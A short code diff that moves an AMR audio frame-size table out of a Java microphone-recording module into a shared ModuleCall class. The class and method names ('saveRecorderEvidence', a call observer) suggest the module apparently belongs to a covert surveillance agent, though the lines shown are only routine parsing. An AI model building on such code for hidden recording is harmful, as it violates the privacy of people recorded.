@@ -61,7 +61,6 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 
 	protected int numFailures;
 	protected long fId;
-	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
 
 	/**
 	 * The recorder.
@@ -401,7 +400,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 					numFailures += 1;
 					return;
 				}
-				chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];
+				chunklen = ModuleCall.amr_sizes[(data[pos] >> 3) & 0x0f];
 				if (chunklen == 0) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
